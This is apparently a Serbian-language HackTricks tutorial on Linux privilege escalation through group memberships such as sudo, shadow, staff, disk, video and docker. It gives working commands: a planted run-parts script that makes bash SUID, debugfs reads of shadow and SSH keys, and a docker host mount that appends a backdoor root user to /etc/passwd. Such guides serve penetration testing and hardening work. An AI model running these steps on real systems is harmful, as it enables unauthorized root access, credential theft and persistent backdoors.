# Zanimljive grupe - Linux Privesc

{{#include ../../../banners/hacktricks-training.md}}

## Sudo/Admin grupe

### **PE - Method 1**

**Ponekad**, sistemska politika **/etc/sudoers** (ili datoteka uključena iz nje) sadrži unose kao što su:<sup>[[3]](#references)</sup>
```bash
# Allow members of group sudo to execute any command
%sudo	ALL=(ALL:ALL) ALL

# Allow members of group admin to execute any command
%admin 	ALL=(ALL:ALL) ALL
```
To znači da svaki korisnik obuhvaćen bilo kojim od ova dva unosa može da pokrene bilo koju komandu kao bilo koji ciljni korisnik putem `sudo` (u skladu sa ostatkom pravila).<sup>[[3]](#references)</sup>

Ako je to slučaj, da biste **postali root, samo izvršite**:
```
sudo su
```
### PE - Method 2

Pronađite sve suid binarne fajlove i proverite da li postoji binarni fajl **Pkexec**:
```bash
find / -perm -4000 2>/dev/null
```
Ako je **pkexec SUID binary**, može da izvrši program kao drugi korisnik samo kada polkit autorizuje zahtevanu radnju; SUID bit sam po sebi ne garantuje root privilegije. Proverite instaliranu policy konfiguraciju i autorizaciju ciljne sesije, umesto da pretpostavite da je članstvo u grupi **sudo** ili **admin** dovoljno.<sup>[[4]](#references)[[5]](#references)</sup>

Na distribucijama koje još koriste stariji Local Authority backend, proverite njegova pravila za grupe pomoću:
```bash
cat /etc/polkit-1/localauthority.conf.d/*
```
Relevantni nazivi grupa i podrazumevane vrednosti razlikuju se u zavisnosti od distribucije; grupa je ovde korisna samo ako je lokalna politika navodi.<sup>[[5]](#references)</sup>

Da biste **postali root, možete izvršiti**:
```bash
pkexec "/bin/sh" #Authentication is required according to the local policy
```
Ako pokušate da izvršite **pkexec** i dobijete ovu **grešku**:
```bash
polkit-agent-helper-1: error response to PolicyKit daemon: GDBus.Error:org.freedesktop.PolicyKit1.Error.Failed: No session for cookie
==== AUTHENTICATION FAILED ===
Error executing command as another user: Not authorized
```
Tokom SSH sesije bez registrovanog authentication agenta, `pkexec` može otkazati sa ovom greškom čak i kada bi policy inače dozvolio radnju; polkit navodi `pkttyagent` kao text authentication agent za non-desktop sesije. Tačno ponašanje zavisi od verzije i distribucije, zato proverite lokalni policy i podešavanje agenta. Jedno zaobilazno rešenje prijavljeno za pogođene verzije NixOS-a koristi **2 različite SSH sesije**.<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>
```bash:session1
echo $$ #Step1: Get current PID
pkexec "/bin/bash" #Step 3, execute pkexec
#Step 5, if correctly authenticate, you will have a root session
```

```bash:session2
pkttyagent --process <PID of session1> #Step 2, attach pkttyagent to session1
#Step 4, you will be asked in this session to authenticate to pkexec
```
## Wheel grupa

Ponekad sudoers policy može sadržati i ovaj unos:
```
%wheel	ALL=(ALL:ALL) ALL
```
To znači da svaki korisnik obuhvaćen ovim unosom može pokrenuti bilo koju komandu kao bilo koji ciljni korisnik putem `sudo` (u skladu sa ostatkom pravila).<sup>[[3]](#references)</sup>

Ako je to slučaj, da biste **postali root, možete jednostavno izvršiti**:
```
sudo su
```
## Shadow grupa

Na sistemima čije im dozvole to omogućavaju, korisnici u grupi **shadow** mogu da **čitaju** **/etc/shadow**; proverite stvarni režim dozvola i ACL-ove na ciljnom sistemu:<sup>[[6]](#references)[[7]](#references)</sup>
```
-rw-r----- 1 root shadow 1824 Apr 26 19:10 /etc/shadow
```
Dakle, pročitajte fajl i pokušajte da **crack-ujete neke hash-eve**.

Kratka napomena o stanju zaključavanja prilikom analize hash-eva:
- Unosi sa `!` ili `*` uglavnom nisu interaktivni za password login.
- `!hash` znači da je password zaključan; preostali znakovi predstavljaju polje password-a pre nego što je zaključano.
- Polje koje sadrži `*` nije validan `crypt(3)` hash i sprečava UNIX-password login; na osnovu njega ne treba zaključivati da li je password ranije bio postavljen.
Ovo je korisno za klasifikaciju account-a čak i kada je direktan login blokiran.<sup>[[6]](#references)</sup>

## Staff grupa

**staff**: Omogućava korisnicima da dodaju lokalne izmene u sistem (`/usr/local`) bez potrebe za root privilegijama (imajte na umu da se izvršni fajlovi u `/usr/local/bin` nalaze u PATH promenljivoj svakog korisnika i da mogu da „override-uju“ izvršne fajlove u `/bin` i `/usr/bin` sa istim nazivom). Uporedite sa grupom „adm“, koja je više povezana sa monitoringom/security-jem.<sup>[[2]](#references)[[7]](#references)</sup>

U Debian konfiguracijama gde se `/usr/local/bin` nalazi pre `/usr/bin` u `PATH`-u (kao u primerima ispod), nekvalifikovana komanda prvo razrešava kopiju iz `/usr/local/bin`; potvrdite efektivni `PATH` na target-u.
```bash
$ echo $PATH
/usr/local/sbin:/usr/sbin:/sbin:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games

# echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```
Ako privilegovani proces razrešava nekvalifikovanu komandu kroz direktorijum sa pravom upisa `/usr/local/bin`, zamena te komande može omogućiti izvršavanje sa privilegijama procesa; pre testiranja potvrdite stvarnu putanju i način pokretanja.

Na Ubuntu sistemima, `pam_motd` pri prijavljivanju izvršava izvršne skripte putem `run-parts --lsbsysinit` kao root; cron poslovi takođe mogu koristiti `run-parts`, ali to zavisi od distribucije i konfiguracije.<sup>[[10]](#references)[[11]](#references)</sup>
```bash
$ cat /etc/crontab | grep run-parts
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
```
Pri novoj SSH prijavi, `pspy` može pomoći da potvrdi da li se ova putanja zaista izvršava na ciljnom sistemu; može posmatrati komandne linije procesa bez root privilegija.<sup>[[10]](#references)[[12]](#references)</sup>
```bash
$ pspy64
2024/02/01 22:02:08 CMD: UID=0     PID=1      | init [2]
2024/02/01 22:02:10 CMD: UID=0     PID=17883  | sshd: [accepted]
2024/02/01 22:02:10 CMD: UID=0     PID=17884  | sshd: [accepted]
2024/02/01 22:02:14 CMD: UID=0     PID=17886  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17887  | sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new
2024/02/01 22:02:14 CMD: UID=0     PID=17888  | run-parts --lsbsysinit /etc/update-motd.d
2024/02/01 22:02:14 CMD: UID=0     PID=17889  | uname -rnsom
2024/02/01 22:02:14 CMD: UID=0     PID=17890  | sshd: mane [priv]
2024/02/01 22:02:15 CMD: UID=0     PID=17891  | -bash
```
**Eksploatacija**
```bash
# 0x1 Add a run-parts script in /usr/local/bin/
$ vi /usr/local/bin/run-parts
#! /bin/bash
chmod 4777 /bin/bash

# 0x2 Don't forget to add a execute permission
$ chmod +x /usr/local/bin/run-parts

# 0x3 start a new ssh sesstion to trigger the run-parts program

# 0x4 check premission for `u+s`
$ ls -la /bin/bash
-rwsrwxrwx 1 root root 1099016 May 15  2017 /bin/bash

# 0x5 root it
$ /bin/bash -p
```
## Disk grupa

Članstvo u grupi **disk** može omogućiti sirov pristup blok uređajima i često je **skoro ekvivalentno root pristupu**; Debian je opisuje kao uglavnom ekvivalentnu root-u, ali proverite stvarne dozvole uređaja i raspored skladišta na ciljnom sistemu.<sup>[[7]](#references)</sup>

Uobičajene putanje uređaja uključuju `/dev/sd*`, ali NVMe i drugi rasporedi skladišta koriste drugačija imena.
```bash
df -h #Find where "/" is mounted
debugfs /dev/sda1
debugfs: cd /root
debugfs: ls
debugfs: cat /root/.ssh/id_rsa
debugfs: cat /etc/shadow
```
`debugfs` radi na ext2/ext3/ext4 datotečnim sistemima; putanje kao što su `/root` i `/etc/shadow` iznad predstavljaju datoteke unutar otvorenog datotečnog sistema, dok je drugi argument komande `dump` izlazna putanja na izvornom datotečnom sistemu.<sup>[[8]](#references)</sup> Na primer, ovo izdvaja `/tmp/asd1.txt` iz otvorenog datotečnog sistema u `/tmp/asd2.txt` na izvornom datotečnom sistemu:
```bash
debugfs /dev/sda1
debugfs:  dump /tmp/asd1.txt /tmp/asd2.txt
```
Opcija `-w` otvara fajl sistem za čitanje i pisanje, a komanda `write` kopira native fajl u otvoreni fajl sistem. Izbegavajte njeno korišćenje na montiranom aktivnom fajl sistemu, jer direktne izmene mogu oštetiti fajl sistem; kada je moguće, radite sa offline image-om.<sup>[[8]](#references)</sup>
```bash
debugfs -w /dev/sda1
debugfs:  write /tmp/asd1.txt /tmp/asd2.txt
```
## Video grupa

Korišćenjem komande `w` možete saznati **ko je prijavljen na sistem** i ona će prikazati izlaz poput sledećeg.<sup>[[20]](#references)</sup>
```bash
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
yossi    tty1                      22:16    5:13m  0.05s  0.04s -bash
moshe    pts/1    10.10.14.44      02:53   24:07   0.06s  0.06s /bin/bash
```
Stavka **tty1** identifikuje prvu Linux virtuelnu konzolu; sama po sebi ne dokazuje da je korisnik fizički prisutan za mašinom, naročito u kontejnerima ili drugim okruženjima.<sup>[[21]](#references)</sup>

Na sistemima koji izlažu čitljiv framebuffer uređaj, članstvo u grupi **video** može omogućiti pristup tom uređaju. Linux framebuffer interfejs dokumentuje `/dev/fb0` kao čitljiv memorijski uređaj koji se može kopirati radi pravljenja snimka ekrana; putanja `/sys/class/graphics/fb0/virtual_size` dostupna je samo tamo gde je prisutan taj fbdev sysfs atribut, zato prvo proverite cilj.<sup>[[7]](#references)[[9]](#references)</sup>
```bash
cat /dev/fb0 > /tmp/screen.raw
cat /sys/class/graphics/fb0/virtual_size
```
Ako instalirana verzija **GIMP** izlaže importer za raw podatke, otvorite **`screen.raw`** pomoću tog importera; podrška i kontrole se razlikuju u zavisnosti od verzije i plug-in-a.<sup>[[22]](#references)</sup>

![Disk Group - Video Group: Da biste otvorili raw sliku, možete koristiti GIMP, izaberite datoteku screen.raw i izaberite Raw image data kao tip datoteke](<../../../images/image (463).png>)

Podesite Width i Height slike tako da odgovaraju geometriji framebuffer-a; isprobajte dostupne formate piksela/Image Types dok izlaz ne bude čitljiv.<sup>[[9]](#references)</sup>

![Disk Group - Video Group: Zatim izmenite Width i Height tako da odgovaraju vrednostima koje se koriste na ekranu i proverite različite Image Types (i izaberite onaj koji najbolje prikazuje ekran)](<../../../images/image (317).png>)

## Root grupa

Članstvo u grupi **root** ne obezbeđuje UID korisnika root, ali datoteke u vlasništvu korisnika `root` u koje grupa može da upisuje i dalje mogu biti zanimljive kada ih privilegovani servisi ili biblioteke koriste. Proverite stvarne dozvole datoteke i način na koji se koristi pre nego što je tretirate kao putanju za eskalaciju privilegija.

**Proverite koje datoteke članovi root grupe mogu da izmene**:
```bash
find / -group root -perm -g=w 2>/dev/null
```
## Docker grupa

Članstvo u `docker` grupi daje root-level pristup Docker daemon-u na standardnim rootful instalacijama. Pošto su bind mounts podrazumevano read-write, korisnik koji može da kontroliše taj daemon može da montira host-ov `/` u container i menja fajlove hosta; ovo efektivno daje root pristup na hostu.<sup>[[13]](#references)[[14]](#references)[[15]](#references)</sup>
```bash
docker image #Get images from the docker service

#Get a shell inside a docker container with access as root to the filesystem
docker run -it --rm -v /:/mnt <imagename> chroot /mnt bash
#If you want full access from the host, create a backdoor in the passwd file
echo 'toor:$1$.ZcF5ts0$i4k6rQYzeegUkacRCvfxC0:0:0:root:/root:/bin/sh' >> /etc/passwd

#Ifyou just want filesystem and network access you can startthe following container:
docker run --rm -it --pid=host --net=host --privileged -v /:/mnt <imagename> chroot /mnt bash
```
Konačno, ako vam se ne dopada nijedan od prethodnih predloga ili iz nekog razloga ne funkcionišu (docker api firewall?), uvek možete pokušati da **pokrenete privilegovani container i escape-ujete iz njega**, kao što je objašnjeno ovde:

{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

Ako imate dozvole za upis u docker socket, pročitajte [**ovaj post o tome kako eskalirati privilegije zloupotrebom docker socket-a**](../../1-linux-basics/linux-privilege-escalation/index.html#writable-docker-socket)**.**

{{#ref}}
https://github.com/KrustyHack/docker-privilege-escalation
{{#endref}}

{{#ref}}
https://fosterelli.co/privilege-escalation-via-docker.html
{{#endref}}

## lxc/lxd Group

{{#ref}}
./
{{#endref}}

## Adm Group

Obično **članovi** grupe **`adm`** imaju dozvole za **čitanje log** datoteka koje se nalaze unutar _/var/log/_.\
Zato, ako ste kompromitovali korisnika koji pripada ovoj grupi, obavezno treba da **pregledate logove**.<sup>[[7]](#references)</sup>

## Backup / Operator / lp / Mail groups

Ove grupe imaju značenja specifična za servis i distribuciju. Debian dokumentuje `backup` za delegirani backup/restore, `lp` za printer daemone, a `mail` za `/var/mail`, zato proverite lokalne dozvole pre nego što članstvo tretirate kao put do privilegija.<sup>[[7]](#references)</sup>

One su često vektori za **credential-discovery**, a ne direktni vektori do root-a:
- **backup**: može otkriti arhive sa konfiguracijama, ključevima, DB dumpovima ili tokenima.
- **operator**: operativni pristup specifičan za platformu koji može da leak-uje osetljive runtime podatke.
- **lp**: print queue/spool datoteke mogu sadržati sadržaj dokumenata.
- **mail**: mail spool-ovi mogu otkriti linkove za resetovanje, OTP-ove i interne credential-e.

Članstvo u ovim grupama tretirajte kao nalaz izlaganja podataka visoke vrednosti i izvršite pivot kroz ponovnu upotrebu lozinki/tokena.

## Auth group

Na OpenBSD-u, kada je S/Key konfigurisan, `/etc/skey` je u vlasništvu `root:auth`, a pristup njegovim zapisima zahteva grupu `auth`; YubiKey zapisi se čuvaju u `/var/db/yubikey`.<sup>[[16]](#references)[[17]](#references)</sup> Ranljiva konfiguracija OpenBSD 6.6 sa omogućenim S/Key-om ili YubiKey-om omogućavala je lokalnim korisnicima sa `auth` privilegijama da postanu root; Qualys dokumentuje preduslov i exploit chain, a povezani PoC ga implementira.<sup>[[18]](#references)[[19]](#references)</sup>

## References

- [1] [Autentikacija pkexec/pkttyagent bez GUI sesije (NixOS issue #18012)](https://github.com/NixOS/nixpkgs/issues/18012#issuecomment-335350903)
- [2] [SystemGroups - Debian Wiki](https://wiki.debian.org/SystemGroups)
- [3] [sudoers(5) — sudo — Debian Manpages](https://manpages.debian.org/bookworm/sudo/sudoers.5.en.html)
- [4] [pkexec — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/pkexec.1.html)
- [5] [polkit — polkit Reference Manual](https://polkit.pages.freedesktop.org/polkit/polkit.8.html)
- [6] [shadow(5) — Linux manual page](https://man7.org/linux/man-pages/man5/shadow.5.html)
- [7] [Priručnik za bezbednost Debiana](https://www.debian.org/doc/manuals/securing-debian-manual/securing-debian-manual.en.pdf)
- [8] [debugfs(8) — Linux manual page](https://www.man7.org/linux/man-pages/man8/debugfs.8.html)
- [9] [Frame Buffer Device — dokumentacija Linux kernela](https://docs.kernel.org/fb/framebuffer.html)
- [10] [update-motd(5) — Ubuntu Manpages](https://manpages.ubuntu.com/manpages/resolute/man5/update-motd.5.html)
- [11] [run-parts(8) — Debian Manpages](https://manpages.debian.org/unstable/debianutils/run-parts.8.en.html)
- [12] [pspy — nadgledanje Linux procesa bez privilegija](https://github.com/DominicBreuker/pspy)
- [13] [Docker Engine security](https://docs.docker.com/engine/security/)
- [14] [Upravljanje Docker-om kao non-root korisnik](https://docs.docker.com/engine/install/linux-postinstall)
- [15] [Pokretanje container-a — Docker Docs](https://docs.docker.com/engine/containers/run/)
- [16] [skey(5) — OpenBSD manual pages](https://man.openbsd.org/skey.5)
- [17] [login_yubikey(8) — OpenBSD manual pages](https://man.openbsd.org/login_yubikey.8)
- [18] [Authentication vulnerabilities in OpenBSD — Qualys Security Advisory](https://www.openwall.com/lists/oss-security/2019/12/04/5)
- [19] [openbsd-authroot — local exploit PoC](https://raw.githubusercontent.com/bcoles/local-exploits/master/CVE-2019-19520/openbsd-authroot)
- [20] [w(1) — Linux manual page](https://man7.org/linux/man-pages/man1/w.1.html)
- [21] [Linux allocated devices (4.x+ version)](https://docs.kernel.org/6.16/admin-guide/devices.html)
- [22] [Image Import and Export — GIMP Documentation](https://docs.gimp.org/3.0/en/gimp-prefs-import-export.html)
{{#include ../../../banners/hacktricks-training.md}}
